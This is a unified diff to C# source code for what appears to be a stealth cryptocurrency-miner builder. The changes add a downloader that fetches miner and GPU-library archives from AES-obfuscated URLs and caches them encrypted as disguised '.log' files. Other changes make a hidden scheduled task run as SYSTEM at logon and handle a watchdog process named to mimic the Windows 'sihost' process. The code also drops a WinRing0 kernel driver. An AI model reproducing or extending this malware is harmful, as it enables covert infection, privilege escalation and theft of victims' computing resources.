@@ -9,6 +9,7 @@ using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
+using System.Linq;
 using Microsoft.Win32;
 #if DefDebug
 using System.Windows.Forms;
@@ -22,8 +23,8 @@ using System.Windows.Forms;
 [assembly: AssemblyCopyright("%Copyright%")]
 [assembly: AssemblyTrademark("%Trademark%")]
 [assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
-[assembly: Guid("%Guid%")]
 #endif
+[assembly: Guid("%Guid%")]
 
 public partial class Program
 {
@@ -44,7 +45,7 @@ public partial class Program
                     Process.Start(new ProcessStartInfo
                     {
                         FileName = "cmd",
-                        Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(plp) + "\"" + " /tr " + "'" + "\"" + (plp) + "\"" + "' & exit",
+                        Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(plp) + "\"" + " /tr " + "'" + "\"" + (plp) + "\"" + "' /RU \"SYSTEM\" & exit",
                         WindowStyle = ProcessWindowStyle.Hidden,
                         CreateNoWindow = true,
                         Verb = "runas"
@@ -76,12 +77,19 @@ public partial class Program
         Thread.Sleep(2 * 1000);
         if (Process.GetCurrentProcess().MainModule.FileName != plp)
         {
+            foreach (Process proc in Process.GetProcessesByName("sihost64"))
+            {
+                proc.Kill();
+            }
+
             File.Copy(Process.GetCurrentProcess().MainModule.FileName, plp, true);
             Thread.Sleep(5 * 1000);
             RBaseFolder();
+            Directory.CreateDirectory(Path.GetDirectoryName(plp));
             Process.Start(new ProcessStartInfo
             {
                 FileName = plp,
+                WorkingDirectory = Path.GetDirectoryName(plp),  
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
             });
@@ -93,12 +101,12 @@ public partial class Program
     public static byte[] RGetTheResource(string rarg1)
     {
         var MyResource = new System.Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly());
-        return RAES_Decryptor((byte[])MyResource.GetObject(rarg1));
+        return RAES_Method((byte[])MyResource.GetObject(rarg1));
     }
 
     public static string RGetString(string rarg1)
     {
-        return Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String(rarg1)));
+        return Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(rarg1)));
     }
 
     public static void RRun(byte[] rarg1, string rarg2, byte[] rarg3)
@@ -112,29 +120,21 @@ public partial class Program
         try
         {
             Directory.CreateDirectory(bD);
-
 #if DefWatchdog
-            foreach (Process proc in Process.GetProcessesByName("sihost64"))
-            {
-                proc.Kill();
-            }
-
-            Thread.Sleep(3000);
-            File.WriteAllBytes(bD + "sihost64.exe", RGetTheResource("#watchdog"));
-
-            Thread.Sleep(1 * 1000);
-
             if (Process.GetProcessesByName("sihost64").Length < 1)
             {
+                File.WriteAllBytes(bD + "sihost64.exe", RGetTheResource("#watchdog"));
+
                 Process.Start(new ProcessStartInfo
                 {
-                    FileName = bD + "sihost64.exe",
+                    FileName = Path.Combine(bD, "sihost64.exe"),
+                    WorkingDirectory = bD,
                     WindowStyle = ProcessWindowStyle.Hidden,
                     CreateNoWindow = true,
                 });
             }
 #endif
-            File.WriteAllBytes(bD + "WR64.sys", RGetTheResource("#winring"));
+            File.WriteAllBytes(Path.Combine(bD, "WR64.sys"), RGetTheResource("#winring"));
         }
         catch (Exception ex)
         {
@@ -181,6 +181,8 @@ public partial class Program
             RBaseFolder();
             string rS = "";
 
+            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
+
 #if DefGPU
             try
             {
@@ -189,7 +191,27 @@ public partial class Program
                 {
                     try
                     {
-                        using (var archive = new ZipArchive(new MemoryStream(RGetTheResource("#libs"))))
+                        byte[] li = {};
+#if DefDownloader
+                        if (!File.Exists(Path.Combine(bD, "sihost64-2.log")))
+                        {
+                            using (var client = new System.Net.WebClient())
+                            {
+                                li = client.DownloadData(RGetString("#LIBSURL"));
+                            }
+#if DefInstall
+                            File.WriteAllBytes(Path.Combine(bD, "sihost64-2.log"), RAES_Method(li, true));
+#endif
+                        }
+                        else
+                        {
+                            li = RAES_Method(File.ReadAllBytes(Path.Combine(bD, "sihost64-2.log")));
+                        }
+#else
+                        li = RGetTheResource("#libs");
+#endif
+
+                        using (var archive = new ZipArchive(new MemoryStream(li)))
                         {
                             foreach (ZipArchiveEntry entry in archive.Entries){
                                 entry.ExtractToFile(Path.Combine(bD, entry.FullName), true);
@@ -228,9 +250,30 @@ public partial class Program
                 Environment.Exit(0);
             }
 
+            byte[] xm = { };
+
+#if DefDownloader
+            if (!File.Exists(Path.Combine(bD, "sihost64.log")))
+            {
+                using (var client = new System.Net.WebClient())
+                {
+                    xm = client.DownloadData(RGetString("#MINERURL"));
+                }
+#if DefInstall
+                File.WriteAllBytes(Path.Combine(bD, "sihost64.log"), RAES_Method(xm, true));
+#endif
+            }
+            else
+            {
+                xm = RAES_Method(File.ReadAllBytes(Path.Combine(bD, "sihost64.log")));
+            }
+#else
+            xm = RGetTheResource("#xmr");
+#endif
+
             try
             {
-                using (var archive = new ZipArchive(new MemoryStream(RGetTheResource("#xmr"))))
+                using (var archive = new ZipArchive(new MemoryStream(xm)))
                 {
                     foreach (ZipArchiveEntry entry in archive.Entries)
                     {
@@ -313,7 +356,7 @@ public partial class Program
     }
 #endif
 
-    public static byte[] RAES_Decryptor(byte[] rarg1)
+    public static byte[] RAES_Method(byte[] rarg1, bool rarg2 = false)
     {
         var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
         var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
@@ -321,10 +364,10 @@ public partial class Program
         var symmetricKey = new RijndaelManaged();
         symmetricKey.KeySize = 256;
         symmetricKey.Mode = CipherMode.CBC;
-        var decryptor = symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes);
+        var encryption = rarg2 ? symmetricKey.CreateEncryptor(k1.GetBytes(16), initVectorBytes) : symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes);
         using (var mStream = new MemoryStream())
         {
-            using (var cStream = new CryptoStream(mStream, decryptor, CryptoStreamMode.Write))
+            using (var cStream = new CryptoStream(mStream, encryption, CryptoStreamMode.Write))
             {
                 cStream.Write(rarg1, 0, rarg1.Length);
                 cStream.Close();
